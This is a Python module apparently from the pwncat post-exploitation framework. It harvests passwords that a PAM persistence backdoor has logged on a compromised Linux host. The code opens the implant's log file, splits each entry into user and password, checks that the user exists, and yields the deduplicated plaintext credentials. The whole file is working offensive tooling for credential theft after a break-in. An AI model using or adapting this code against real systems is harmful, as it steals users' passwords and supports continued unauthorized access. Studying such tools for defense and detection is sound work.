#!/usr/bin/env python3

from pwncat.facts import PotentialPassword
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule

"""
TODO: This module is specifically used to check if we have passwords set
from previously running a paired PAM persistence backdoor. If the persistence
isn't in place already, there is no reason to run this enumeration module.
The persistence module has not been re-implemented in the new platforms
framework so this can't be updated just yet.
"""


class Module(EnumerateModule):
    """
    Exfiltrate logged passwords from the pam-based persistence
    module. This persistence module logs all attempted passwords
    for all users in a known location. We read this file and yield
    all passwords we have collected.
    """

    PLATFORM = [Linux]
    SCHEDULE = Schedule.ALWAYS
    PROVIDES = ["creds.password"]

    def enumerate(self, session):

        # Ensure the user database is already retrieved
        session.find_user(uid=0)

        for implant in session.run("enumerate", types=["implant.*"]):
            if implant.source != "linux.implant.pam":
                continue

            # Just in case we have multiple of the same password logged
            observed = []

            try:
                with session.platform.open(implant.log, "r") as filp:
                    for lineno, line in enumerate(filp):
                        line = line.rstrip("\n")
                        if line in observed:
                            continue

                        user, *password = line.split(":")
                        password = ":".join(password)

                        try:
                            # Check for valid user name
                            user_info = session.find_user(name=user)
                        except KeyError:
                            continue

                        observed.append(line)

                        yield PotentialPassword(
                            self.name, password, implant.log, lineno, user_info.id
                        )
            except (FileNotFoundError, PermissionError):
                pass
